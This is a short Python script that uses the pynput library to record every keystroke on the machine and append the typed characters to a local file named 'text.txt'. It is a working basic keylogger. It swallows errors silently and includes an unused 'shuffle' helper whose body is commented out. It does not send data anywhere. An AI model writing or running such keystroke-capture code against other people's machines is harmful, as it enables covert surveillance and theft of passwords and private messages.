from pynput.keyboard import Key, Listener

FILE_NAME = 'text.txt'
out = []

def on_press(key):
    try:
        char = key.char
    except:
        #char = key
        char = ''
    finally:
        out.append(char)
def on_release(key):
    char = ''
    out.append(char)
    pass

def shuffle(out):
    import random
    # random.shuffle(out)

if __name__ == '__main__':
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except:
        pass
    shuffle(out)

    with open(FILE_NAME, mode='a') as f:
        f.write(''.join(out))
